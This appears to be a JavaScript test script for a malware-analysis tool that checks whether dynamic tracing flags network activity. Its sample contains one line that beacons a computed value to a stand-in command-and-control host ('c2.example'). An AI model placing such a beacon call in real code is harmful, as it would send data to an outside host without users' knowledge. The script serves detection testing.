import { analyzeSample } from '../../../tools/analysis/orchestrator.js'

const src = `
var s = 0;
for (var i = 0; i < 6000; i++) { s += i }
fetch('https://c2.example/beacon?d=' + s);
s;
`

const bag = await analyzeSample(src, { filename: 'big.js' })
const report = bag.report ?? bag
const reasons = (report.verdict?.reasons ?? []).map((r) => r.code ?? r.id ?? r)
const out = {
  dynamicEventsRetained: report.dynamic?.events?.length ?? null,
  countsByKind: report.dynamic?.counts?.byKind ?? null,
  total: report.dynamic?.counts?.total ?? null,
  tracingByKind: report.tracing?.byKind ?? null,
  verdictLevel: report.verdict?.level,
  verdictScore: report.verdict?.score,
  verdictReasons: reasons,
  hasDynamicNetwork: reasons.includes('DYNAMIC_NETWORK'),
  truncated: report.tracing?.truncated,
  truncatedBy: report.tracing?.truncatedBy,
}
console.log('keepTrace=true', JSON.stringify(out, null, 2))

const bag2 = await analyzeSample(src, { filename: 'big.js', keepTrace: false })
const report2 = bag2.report ?? bag2
const reasons2 = (report2.verdict?.reasons ?? []).map((r) => r.code ?? r.id ?? r)
console.log('keepTrace=false', JSON.stringify({
  dynamicEventsRetained: report2.dynamic?.events?.length ?? null,
  countsByKind: report2.dynamic?.counts?.byKind ?? null,
  verdictLevel: report2.verdict?.level,
  verdictScore: report2.verdict?.score,
  verdictReasons: reasons2,
  hasDynamicNetwork: reasons2.includes('DYNAMIC_NETWORK'),
}, null, 2))
